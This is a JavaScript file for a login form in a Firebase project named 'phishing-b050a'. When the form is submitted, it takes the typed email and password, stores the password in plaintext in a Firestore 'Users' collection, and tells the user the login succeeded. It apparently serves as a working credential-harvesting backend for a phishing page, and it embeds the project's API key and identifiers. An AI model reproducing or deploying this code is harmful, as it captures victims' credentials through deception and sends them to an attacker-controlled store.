import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } 
from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDJg5N0FCaNkhQ8S4N9yy-vMcA9wOsoSFc",
  authDomain: "phishing-b050a.firebaseapp.com",
  projectId: "phishing-b050a",
  storageBucket: "phishing-b050a.appspot.com",
  messagingSenderId: "1027939832158",
  appId: "1:1027939832158:web:80271cd17822a87df07fcf",
  measurementId: "G-1T0SLMXKP5"
};


const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

const email = document.getElementById("user").value;
const password = document.getElementById("password").value;

const submit = document.getElementById("submit");
submit.addEventListener("click", async function(event){
    event.preventDefault()

    const email = document.getElementById("user").value;
    const password = document.getElementById("password").value;

    try {
        const userCredential = await createUserWithEmailAndPassword(auth, email, password);
        const user = userCredential.user;

        await setDoc(doc(db, "Users", user.uid), {
            email: email,
            password: password 
        });

        alert("LogIn successful");
    } 
    catch (error) {
        alert("Error: " + error.message);
    }
}
    
);



